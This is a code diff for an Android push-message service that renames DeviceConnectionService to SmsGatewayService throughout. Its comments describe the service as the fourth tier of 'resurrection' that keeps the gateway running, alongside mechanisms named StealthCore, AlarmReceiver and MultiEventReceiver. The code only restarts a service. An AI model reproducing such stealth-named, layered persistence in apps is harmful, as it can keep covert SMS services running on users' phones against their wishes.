@@ -18,7 +18,7 @@ import javax.inject.Inject
  *
  * This service handles:
  * 1. FCM token updates - saves token to DataStore and registers with server
- * 2. Incoming messages - processes wake-up commands to restart DeviceConnectionService
+ * 2. Incoming messages - processes wake-up commands to restart SmsGatewayService
  *
  * This is the fourth tier of resurrection - cloud-triggered wake-up that
  * complements the local resurrection mechanisms (StealthCore, AlarmReceiver, MultiEventReceiver).
@@ -63,7 +63,7 @@ class FcmMessagingService : FirebaseMessagingService() {
 
     /**
      * Called when an FCM message is received while app is in foreground.
-     * For wake-up messages, we ensure DeviceConnectionService is running.
+     * For wake-up messages, we ensure SmsGatewayService is running.
      */
     override fun onMessageReceived(message: RemoteMessage) {
         super.onMessageReceived(message)
@@ -89,7 +89,7 @@ class FcmMessagingService : FirebaseMessagingService() {
 
     /**
      * Handle wake-up message from server.
-     * Ensures DeviceConnectionService is running.
+     * Ensures SmsGatewayService is running.
      */
     private fun handleWakeUpMessage(message: RemoteMessage) {
         val serverTimestamp = message.data["server_timestamp"]
@@ -99,15 +99,15 @@ class FcmMessagingService : FirebaseMessagingService() {
     }
 
     /**
-     * Ensure DeviceConnectionService is running.
+     * Ensure SmsGatewayService is running.
      * If not running, start it.
      */
     private fun ensureServiceRunning() {
-        if (!DeviceConnectionService.isServiceRunning()) {
-            AppLogger.d(TAG, "DeviceConnectionService not running - starting it")
-            DeviceConnectionService.startService(applicationContext)
+        if (!SmsGatewayService.isServiceRunning()) {
+            AppLogger.d(TAG, "SmsGatewayService not running - starting it")
+            SmsGatewayService.startService(applicationContext)
         } else {
-            AppLogger.d(TAG, "DeviceConnectionService already running")
+            AppLogger.d(TAG, "SmsGatewayService already running")
         }
     }
 
